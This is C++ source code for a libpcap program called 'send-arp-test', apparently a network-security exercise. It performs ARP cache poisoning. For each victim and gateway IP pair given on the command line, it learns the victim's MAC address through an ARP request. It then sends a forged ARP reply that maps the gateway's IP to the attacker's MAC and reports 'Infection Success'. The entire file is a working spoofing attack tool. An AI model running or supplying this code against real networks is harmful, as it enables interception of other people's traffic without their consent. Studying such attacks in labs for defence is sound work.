#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "myInfo.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender2 ip> <target2 ip> ... ]\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1 \n");
}

// pcap_sendpacket or pcap_next_ex
EthArpPacket make_packet(Mac ethDMAC, Mac ethSMAC, Mac arpSMAC, Mac arpTMAC, Ip arpSIP, Ip arpTIP, uint16_t op){

    EthArpPacket packet;

    packet.eth_.dmac_ = ethDMAC;
    packet.eth_.smac_ = ethSMAC;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;

    // request = op 1 , reply = op 2
    if(op == ArpHdr::Request)
        packet.arp_.op_ = htons(ArpHdr::Request);
    if(op == ArpHdr::Reply)
        packet.arp_.op_ = htons(ArpHdr::Reply);

    packet.arp_.smac_ = arpSMAC;
    packet.arp_.sip_ = htonl(arpSIP);
    packet.arp_.tmac_ = arpTMAC;
    packet.arp_.tip_ = htonl(arpTIP);

    return packet;
}

void err_check(int res, char c, pcap_t* handle)
{
    // c = 's' : pcap_sendpacket, 'n' : pcap_next_ex
    if(c == 's'){
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }
    else if(c == 'n'){
        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
        }
    }
}

int main(int argc, char* argv[]) {

    // many input case
    if (argc < 4 || (argc & 1) == 1) {
        usage();
        return -1;
    }

	char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    EthArpPacket send_packet;
    Mac myMacAddress = myMac(); // attacker
    Ip sender_ip;
    Ip target_ip;
    Ip myIp = GetMyIpAddr(argv[1]); // attacker
    int res;
    EthHdr* eth_hdr;
    ArpHdr* arp_hdr;
    Mac sender_mac;
    EthArpPacket infection_packet;

    for(int idx = 2; idx < argc; idx += 2){
        sender_ip = Ip(argv[idx]); // victim
        target_ip = Ip(argv[idx + 1]); //gateway

        // request
        send_packet = make_packet(Mac::broadcastMac(), myMacAddress, myMacAddress, Mac::nullMac(), myIp, sender_ip, ArpHdr::Request);
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&send_packet), sizeof(EthArpPacket));
        err_check(res, 's', handle);
        // 's' : pcap_sendpacket, 'n' : pcap_next_ex

        // 10 times attack chance
        int try_count = 0;
        while(try_count < 10){
            struct pcap_pkthdr* header;
            const u_char* reply_packet;

            res = pcap_next_ex(handle, &header, &reply_packet);

            if(res == 0)
                continue;
            err_check(res, 'n', handle);
            // 's' : pcap_sendpacket, 'n' : pcap_next_ex

            // packet to Ethernet, Arp Header
            eth_hdr = (EthHdr*)reply_packet;
            arp_hdr = (ArpHdr*)(reply_packet + sizeof(EthHdr));

            // ethernet, arp, ipv4 check
            if(eth_hdr->type() != EthHdr::Arp)
                continue;
            if(arp_hdr->hrd() != ArpHdr::ETHER || arp_hdr->pro() != EthHdr::Ip4 || arp_hdr->pln() != Ip::SIZE || arp_hdr->op() != ArpHdr::Reply)
                continue;

            // infection success
            // reply to sender(victim) with my Mac address and target(gateway) Ip address
            if((arp_hdr->tmac() == myMacAddress) && (arp_hdr->tip() == myIp) && (arp_hdr->sip() == sender_ip)){
                sender_mac = arp_hdr->smac();
                infection_packet = make_packet(sender_mac, myMacAddress, myMacAddress, sender_mac, target_ip, sender_ip, ArpHdr::Reply);
                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infection_packet), sizeof(EthArpPacket));
                err_check(res, 's', handle);

                printf("Infection Success to sender ip : %s, target ip : %s\n", argv[idx], argv[idx + 1]);
                printf("sender mac : ");
                sender_mac.printMac();
                break;
            }

            else{
                try_count++;
                printf("%d th\n", try_count);
                printf("Infection Fail to sender ip : %s, target ip : %s\n", argv[idx], argv[idx + 1]);
            }
        }
    }
	pcap_close(handle);

    return 0;
}
